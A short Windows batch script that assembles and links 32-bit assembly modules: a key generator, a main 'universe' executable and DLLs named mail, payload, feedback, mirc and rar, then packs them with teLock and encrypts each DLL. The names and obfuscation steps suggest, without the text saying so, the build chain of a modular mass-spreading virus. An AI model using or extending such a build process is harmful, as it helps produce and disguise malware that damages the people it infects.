@echo off

cd utils
tasm32 /ml /m9 /q cryptkey
tasm32 /ml /m9 /q bin2inc
tlink32 -Tpe -c -x -aa cryptkey,,,e:\tasm5\lib\import32,..\universe
tlink32 -Tpe -c -x -aa bin2inc,,,e:\tasm5\lib\import32
del cryptkey.obj
del bin2inc.obj
pewrsec cryptkey.exe
pewrsec bin2inc.exe
cryptkey.exe

bin2inc crypt.key
move output.inc ..\key.inc
bin2inc crypt_pp.key
move output.inc ..\key_pp.inc

cd ..
tasm32 /ml /m9 /q universe
tlink32 -Tpe -c -x -aa universe,,,e:\tasm5\lib\import32,universe,universe
del universe.obj
pewrsec universe.exe

cd dll
tasm32 /ml /m9 /q mail
tasm32 /ml /m9 /q payload
tasm32 /ml /m9 /q feedback
tasm32 /ml /m9 /q mirc
tasm32 /ml /m9 /q rar
tlink32 -Tpd -c -x -aa mail,,,e:\tasm5\lib\import32,dllz
tlink32 -Tpd -c -x -aa payload,,,e:\tasm5\lib\import32,dllz
tlink32 -Tpd -c -x -aa feedback,,,e:\tasm5\lib\import32,dllz
tlink32 -Tpd -c -x -aa mirc,,,e:\tasm5\lib\import32,dllz
tlink32 -Tpd -c -x -aa rar,,,e:\tasm5\lib\import32,dllz
del mail.obj
del payload.obj
del feedback.obj
del mirc.obj
del rar.obj
pewrsec mail.dll
pewrsec payload.dll
pewrsec feedback.dll
pewrsec mirc.dll
pewrsec rar.dll

cd ..\utils
tasm32 /ml /m9 /q encr
tlink32 -Tpe -c -x -aa encr,,,e:\tasm5\lib\import32,..\universe
del encr.obj
pewrsec encr.exe

telock51\telock51.exe
encr.exe ..\dll\mail.dll
encr.exe ..\dll\payload.dll
encr.exe ..\dll\feedback.dll
encr.exe ..\dll\mirc.dll
encr.exe ..\dll\rar.dll
